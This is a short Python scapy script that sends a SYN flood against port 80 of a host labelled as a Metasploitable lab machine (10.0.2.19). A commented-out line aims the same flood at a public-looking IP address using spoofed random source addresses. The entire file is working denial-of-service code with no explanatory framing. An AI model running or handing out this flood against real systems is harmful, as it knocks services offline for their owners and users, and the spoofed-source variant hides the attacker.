#!/usr/bin/python3
from scapy.all import *

# The following is a SYN Flood attack on http port of metasploitable

metasploitable_IP="10.0.2.19"  # target IP address, victim of SYN flood
target_port=80  # attacking the http port

try:
    # packet=IP(dst="37.202.5.70",src=RandIP("192.168.1.246/24")) / TCP(dport=80,sport=RandShort(),flags="S")
    packet=IP(dst=metasploitable_IP) / TCP(dport=target_port,sport=RandShort(),flags="S")
    srloop(packet,iface='lo')
except Exception as e:
    print(e)